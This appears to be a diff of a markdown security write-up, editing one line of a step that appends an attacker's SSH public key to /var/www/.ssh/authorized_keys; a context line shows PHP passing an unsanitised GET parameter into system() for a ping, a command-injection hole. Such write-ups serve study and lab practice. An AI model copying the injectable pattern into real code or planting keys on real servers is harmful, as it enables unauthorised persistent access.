@@ -100,7 +100,7 @@ system("ping -c 1 ".$_GET["ip"]);
 ```
 ssh-keygen -t rsa -b 4096
 cat  /.ssh/id_rsa.pub
-echo "your key" > /var/www/.ssh/authorized_keys
+echo "your key from the cat" > /var/www/.ssh/authorized_keys
 ```
 # Demo
 ```
